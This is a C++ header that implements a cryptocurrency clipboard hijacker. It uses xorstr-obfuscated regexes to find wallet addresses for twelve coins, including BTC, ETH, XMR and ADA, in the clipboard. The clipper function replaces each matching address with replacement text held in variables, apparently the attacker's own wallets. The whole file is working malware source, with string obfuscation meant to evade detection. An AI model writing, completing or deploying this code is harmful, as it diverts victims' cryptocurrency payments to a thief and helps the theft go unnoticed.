#pragma once

std::string btc_regex = xorstr(R"((?:^|\s)(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}(?=\s|$))");
std::string ltc_regex = xorstr(R"((?:^|\s)([LM3][a-km-zA-HJ-NP-Z1-9]{26,33}|ltc1[a-zA-HJ-NP-Z0-9]{8,87})(?=\s|$))");
std::string eth_regex = xorstr(R"((?:^|\s)(0x[a-fA-F0-9]{40})(?=\s|$))");
std::string xmr_regex = xorstr(R"((?:^|\s)([48][0-9AB][1-9A-HJ-NP-Za-km-z]{93})(?=\s|$))");
std::string xrp_regex = xorstr(R"((?:^|\s)(r[0-9a-zA-Z]{33})(?=\s|$))");
std::string neo_regex = xorstr(R"((?:^|\s)(A[0-9a-zA-Z]{33})(?=\s|$))");
std::string bch_regex = xorstr(R"((?:^|\s)((bitcoincash:)?(q|p)[a-z0-9]{41})(?=\s|$))");
std::string doge_regex = xorstr(R"((?:^|\s)(D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32})(?=\s|$))");
std::string dash_regex = xorstr(R"((?:^|\s)(X[1-9A-HJ-NP-Za-km-z]{33})(?=\s|$))");
std::string tron_regex = xorstr(R"((?:^|\s)(T[1-9A-HJ-NP-Za-km-z]{33})(?=\s|$))");
std::string bnb_regex = xorstr(R"((?:^|\s)(bnb1[a-zA-HJ-NP-Z0-9]{38})(?=\s|$))");
std::string ada_regex = xorstr(R"((?:^|\s)(addr1[0-9a-z]{98})(?=\s|$))");

struct CryptoInfo {
    std::string currency_name;
    std::regex regex_pattern;
    std::string clipboard_replace_text;
    bool clipping;
};

CryptoInfo crypto_info[] = {
    {xorstr("BTC"), std::regex(btc_regex), btc, m_btc},
    {xorstr("LTC"), std::regex(ltc_regex), ltc, m_ltc},
    {xorstr("DOGE"), std::regex(doge_regex), doge, m_doge},
    {xorstr("ETH"), std::regex(eth_regex), eth, m_eth},
    {xorstr("XMR"), std::regex(xmr_regex), xmr, m_xmr},
    {xorstr("XRP"), std::regex(xrp_regex), xrp, m_xrp},
    {xorstr("NEO"), std::regex(neo_regex), neo, m_neo},
    {xorstr("DASH"), std::regex(dash_regex), dash, m_dash},
    {xorstr("DCH"), std::regex(bch_regex), bch, m_bch},
    {xorstr("TRON"), std::regex(tron_regex), tron, m_tron},
    {xorstr("BNB"), std::regex(bnb_regex), bnb, m_bnb},
    {xorstr("ADA"), std::regex(ada_regex), ada, m_ada}
};

void detected(std::string clipboard_text) {
    log(xorstr("Clipboard: ") + clipboard_text);
}

void clipper(std::string value)
{
    for (const CryptoInfo& info : crypto_info) {
        if (std::regex_search(value, info.regex_pattern) && info.clipping) {
#ifdef DEBUGGING
            log(std::string(xorstr("Detected: ")) + info.currency_name);
            detected(value);
#endif

            std::string replaced_value = std::regex_replace(value, info.regex_pattern, info.clipboard_replace_text);
            set_clipboard_text(replaced_value.c_str());
        }
    }
}